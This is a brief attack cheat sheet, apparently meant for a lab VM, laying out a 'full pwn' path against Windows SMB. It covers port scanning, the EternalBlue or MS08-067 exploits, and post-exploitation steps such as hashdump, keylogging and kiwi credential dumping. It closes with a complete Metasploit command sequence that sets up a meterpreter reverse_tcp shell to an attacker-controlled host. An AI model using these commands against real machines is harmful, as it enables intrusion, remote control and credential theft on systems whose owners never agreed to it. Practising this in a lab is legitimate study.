  RECOMMENDED "FULL PWN" PATH

  1. Recon:        nmap -p 445,139,135 <target>
  2. Exploit:      ms17_010_eternalblue  (or ms08_067_netapi)
  3. Escalate:     (already SYSTEM from those)
  4. Post:         hashdump, screenshot, keylog
  5. For fun:      load kiwi, creds_all

  Quick start for your VM:

    msfconsole
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS <victim-ip>
    set PAYLOAD windows/x64/meterpreter/reverse_tcp
    set LHOST <your-ip>
    run

  (use x86 payload for 32-bit XP, obviously)

